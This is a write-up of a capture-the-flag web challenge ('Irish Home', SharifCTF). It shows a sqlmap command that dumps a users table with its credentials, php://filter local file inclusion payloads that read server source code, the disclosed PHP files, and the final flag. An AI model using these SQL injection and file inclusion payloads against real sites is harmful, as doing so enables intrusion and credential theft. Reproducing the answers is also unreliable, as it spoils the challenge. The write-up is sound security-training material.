Irish Home
WEB - 207 points

http://ctf.sharif.edu:8082/


This was a blog with two posts,  i took a quick look at the sauce but there was nothing exciting and I checked for common files like robots.txt, but found nothing. However, there was a login page:
http://ctf.sharif.edu:8082/login.php

Tested with admin: admin and was told "That account does not seem to exist," ok so the admin user does not exist.
I then began playing with sqlmap and after a short while, so I saw that it was vulnerable - sql injection, the final payload to get the user name and password were:


-u http://ctf.sharif.edu:8082/login.php --data="username=admin&password=admin" --level=3 -D irish_home -T users -C username,password --dump

Table: users
[1 entry]
+------------+----------------------------------+
| username   | password                         |
+------------+----------------------------------+
| Cuchulainn | 2a7da9c@088ba43a_9c1b4Xbyd231eb9 |
+------------+----------------------------------+


So I was able to log into the control panel and there were a couple of different functions - delete and edit.
You could also check out the pages that existed:
http://ctf.sharif.edu:8082/pages/show.php?page=notice

The 'notice' page gave me information that flag.php has been deleted:

"Important Notice
Ter de pesky contestants av dat bleedin darn SharifCTF:

Sum bugger deleted me beloved flag.php file.
Oi want it back! not next week, not the-morra — roi nigh!
An' be queck aboyt it, as naw opshuns is aff de table.
Don't tell me lay-ra dat yer weren't warned."


Did some fuzzing on 'page =' with burp but didn't find anything interesting. Another team member - deep noticed that it was possible to load any file with php as extension.
But flag.php was removed: /

After some headache, I realized that with php filters it may be possible to read the code, and it worked \o/
php://filter/convert.base64-encode/resource=file

First I tested with notice.php and it went well, so delete.php was the obvious the interesting file.
http://ctf.sharif.edu:8082/pages/show.php?page=php://filter/convert.base64-encode/resource%3d../delete

The code from delete.php :

<?php
require_once('header.php');

if(isset($_GET['page'])) {
	$fname = $_GET['page'] . ".php";
	$fpath = "pages/$fname";
	if(file_exists($fpath)) {
		rename($fpath, "deleted_3d5d9c1910e7c7/$fname");
	}
}


?>
<div style="text-align: center;">
<h3 style="color: red;">Site is under maintenance 'til de end av dis f$#!*^% SharifCTF.</h3><br/>
<h4><b>Al' destructive acshuns are disabled!</b></h4>
</div>
<?php
require_once('footer.php');
?>


Ok so the file was not deleted, the script just moved it to a different folder: rename($fpath, "deleted_3d5d9c1910e7c7/$fname");

So the next payload to read flag.php:
php://filter/convert.base64-encode/resource%3d../deleted_3d5d9c1910e7c7/flag


<?php

$username = 'Cuchulainn';
$password = ;	// Oi don't save me bleedin password in a shithole loike dis.

$salt = 'd34340968a99292fb5665e';

$tmp = $username . $password . $salt;
$tmp = md5($tmp);

$flag = "SharifCTF{" . $tmp . "}";

echo $flag;
?>

Last step - declare the variable $password with the password('2a7da9c@088ba43a_9c1b4Xbyd231eb9') and then run the code to get the flag.

SharifCTF{65892135758717f9d9dfd7063d2c2281}


